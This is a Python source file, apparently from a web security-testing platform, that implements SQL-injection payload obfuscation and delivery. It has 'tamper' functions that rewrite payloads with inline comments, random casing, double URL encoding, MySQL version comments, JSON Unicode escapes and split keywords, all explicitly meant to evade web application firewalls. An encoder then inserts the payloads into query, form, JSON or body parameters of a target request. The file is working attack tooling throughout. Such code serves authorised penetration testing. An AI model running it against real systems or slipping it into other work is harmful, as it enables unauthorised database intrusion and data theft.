

from dataclasses import dataclass
from typing import Any
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from aiva_common.schemas import FunctionTaskPayload


@dataclass
class EncodedPayload:
    url: str
    method: str
    payload: str
    request_kwargs: dict[str, Any]

    def build_request_dump(self) -> str:
        lines = [f"{self.method} {self.url}"]
        if "headers" in self.request_kwargs:
            for key, value in self.request_kwargs["headers"].items():
                lines.append(f"{key}: {value}")
        body_parts = []
        if "params" in self.request_kwargs:
            body_parts.append(f"params={self.request_kwargs['params']}")
        if "data" in self.request_kwargs:
            body_parts.append(f"data={self.request_kwargs['data']}")
        if "json" in self.request_kwargs:
            body_parts.append(f"json={self.request_kwargs['json']}")
        if "content" in self.request_kwargs:
            body_parts.append(f"content={self.request_kwargs['content']!r}")
        if body_parts:
            lines.append("\n".join(body_parts))
        return "\n".join(lines)



@dataclass
class TamperProfile:
    name: str
    description: str
    func: callable


class PayloadTamperMixin:
    """Tamper 混淆邏輯 Mixin"""

    def _register_tampers(self) -> list[TamperProfile]:
        """註冊所有可用的 Tamper 函數"""
        return [
            TamperProfile("space2comment", "Replaces space with /**/", self._tamper_space2comment),
            TamperProfile("randomcase", "Randomizes case", self._tamper_randomcase),
            TamperProfile("urlencode", "Double URL Encode", self._tamper_urlencode),
            TamperProfile("between", "Replaces > with BETWEEN", self._tamper_between),
            TamperProfile("version_comment", "MySQL inline comment", self._tamper_version_comment),
            TamperProfile("json_unicode", "JSON Unicode Escape", self._tamper_json_unicode),
            TamperProfile("concat_bypass", "String concatenation bypass", self._tamper_concat_bypass),
        ]

    def apply_tamper(self, payload: str, evasion_level: int = 0) -> list[str]:
        """
        根據當前的 Evasion Level，對原始 Payload 進行變形
        """
        if evasion_level == 0:
            return [payload]

        tampered_payloads = [payload]

        # 低混淆: 隨機大小寫
        if evasion_level >= 1:
            tampered_payloads.append(self._tamper_randomcase(payload))

        # 中混淆: 空格替換 + 註釋
        if evasion_level >= 2:
            p = self._tamper_space2comment(payload)
            tampered_payloads.append(p)
            tampered_payloads.append(self._tamper_version_comment(payload))

        # 高混淆: 雙重編碼 + 組合拳 + JSON Unicode + 拼接繞過
        if evasion_level >= 3:
            p = self._tamper_space2comment(payload)
            p = self._tamper_urlencode(p)
            tampered_payloads.append(p)

            p2 = self._tamper_between(payload)
            tampered_payloads.append(p2)

            # 新增高階黑盒 WAF 繞過
            p3 = self._tamper_json_unicode(payload)
            tampered_payloads.append(p3)

            p4 = self._tamper_space2comment(self._tamper_concat_bypass(payload))
            tampered_payloads.append(p4)

        return list(set(tampered_payloads))

    def _tamper_space2comment(self, payload: str) -> str:
        """SELECT * FROM -> SELECT/**/FROM"""
        return payload.replace(" ", "/**/")

    def _tamper_randomcase(self, payload: str) -> str:
        """SELECT -> SeLeCT"""
        import random
        ret = []
        for char in payload:
            if char.isalpha() and random.choice([True, False]):
                ret.append(char.swapcase())
            else:
                ret.append(char)
        return "".join(ret)

    def _tamper_urlencode(self, payload: str) -> str:
        """Double URL Encode"""
        import urllib.parse
        return urllib.parse.quote(urllib.parse.quote(payload))

    def _tamper_between(self, payload: str) -> str:
        """ > 5 -> BETWEEN 5 AND 5 """
        if ">" in payload and "BETWEEN" not in payload:
            return payload.replace(">", " BETWEEN ")
        return payload

    def _tamper_version_comment(self, payload: str) -> str:
        """UNION SELECT -> /*!UNION*/ SELECT"""
        return payload.replace("UNION", "/*!UNION*/").replace("SELECT", "/*!SELECT*/")

    def _tamper_json_unicode(self, payload: str) -> str:
        """
        避免 WAF 直接比對字串，將單引號、雙引號、空格等轉換為 JSON/JS 的 Unicode escape
        例如: ' OR 1=1 -> \u0027\u0020OR\u00201=1
        主要用於注入在 JSON Body 時，讓 WAF 看不懂，但後端 JSON parser 能成功還原。
        """
        escaped_payload = ""
        for char in payload:
            if char in ("'", '"', ' ', '<', '>', '=', '(', ')'):
                escaped_payload += f"\\u{ord(char):04x}"
            else:
                escaped_payload += char
        return escaped_payload

    def _tamper_concat_bypass(self, payload: str) -> str:
        """
        String concatenation bypass for keywords
        替換敏感關鍵字 (SELECT, UNION, FROM) 讓它們被分段
        這裡使用通用的註解混淆來打斷關鍵字，使 WAF signature match 失敗
        SELECT -> SE/**/LECT
        """
        import re
        patterns = {
            r'(?i)\bSELECT\b': 'SE/**/LECT',
            r'(?i)\bUNION\b': 'UN/**/ION',
            r'(?i)\bFROM\b': 'FR/**/OM',
            r'(?i)\bWHERE\b': 'WH/**/ERE',
            r'(?i)\bADMIN\b': 'AD/**/MIN',
            r'(?i)\bSLEEP\b': 'SL/**/EEP',
            r'(?i)\bDELAY\b': 'DE/**/LAY'
        }
        tampered = payload
        for pattern, replacement in patterns.items():
            tampered = re.sub(pattern, replacement, tampered)
        return tampered


class PayloadWrapperEncoder(PayloadTamperMixin):
    """
    Payload 包裝和編碼器

    提供多種編碼和包裝技術來繞過 WAF 和輸入過濾，
    增加 SQL 注入 payload 的成功率。同時整合平台接口。
    """

    def __init__(self, task: FunctionTaskPayload) -> None:
        self._task = task

    @property
    def task(self) -> FunctionTaskPayload:
        return self._task

    def encode(self, payload: str) -> EncodedPayload:
        """將 payload 編碼為目標請求格式"""
        target = self._task.target
        method = target.method.upper() if target.method else "GET"
        headers = dict(target.headers)
        cookies = dict(target.cookies)
        location = (target.parameter_location or "query").lower()
        parameter = target.parameter

        request_kwargs: dict[str, Any] = {"headers": headers, "cookies": cookies}

        if location == "query":
            base_params = dict(
                parse_qsl(urlparse(str(target.url)).query, keep_blank_values=True)
            )
            if parameter:
                base_params[parameter] = payload
            request_kwargs["params"] = base_params
            url = str(target.url)
        elif location == "form" and method in {"POST", "PUT", "PATCH"}:
            data = dict(target.form_data)
            if parameter:
                data[parameter] = payload
            request_kwargs["data"] = data
            url = str(target.url)
        elif location == "json" and method in {"POST", "PUT", "PATCH"}:
            json_payload = dict(target.json_data or {})
            if parameter:
                json_payload[parameter] = payload
            request_kwargs["json"] = json_payload
            request_kwargs.setdefault("headers", {})["Content-Type"] = (
                "application/json"
            )
            url = str(target.url)
        elif location == "body":
            body = target.body or ""
            request_kwargs["content"] = body.replace("{{INJECT}}", payload)
            url = str(target.url)
        else:
            raise ValueError(
                f"Unknown parameter location: {location}. "
                f"Supported locations: query, form, json, body. "
                f"Please check the FunctionTaskTarget configuration."
            )

        request_kwargs = {k: v for k, v in request_kwargs.items() if v}

        return EncodedPayload(
            url=url,
            method=method,
            payload=payload,
            request_kwargs=request_kwargs,
        )

    @staticmethod
    def _inject_query(url: str, parameter: str | None, value: str) -> str:
        if not parameter:
            return url
        parts = list(urlparse(url))
        query_pairs = dict(parse_qsl(parts[4], keep_blank_values=True))
        query_pairs[parameter] = value
        parts[4] = urlencode(query_pairs, doseq=True)
        return urlunparse(parts)